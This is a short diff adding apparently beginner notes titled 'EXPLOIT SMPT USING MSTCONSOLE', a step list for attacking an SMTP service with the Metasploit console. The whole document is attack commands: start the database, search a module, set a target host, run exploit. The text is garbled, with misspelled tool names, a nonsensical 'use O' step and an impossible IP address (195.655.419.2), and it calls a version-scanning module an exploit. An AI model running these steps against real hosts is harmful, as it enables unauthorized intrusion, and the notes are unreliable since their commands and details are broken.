@@ -1,0 +1,9 @@
+                  EXPLOIT SMPT USING MSTCONSOLE
+
+Service postgrcsql start
+mstconsole
+=search smtp_version
+=use O
+=show options
+=set RHOSTS 195.655.419.2
+=exploit
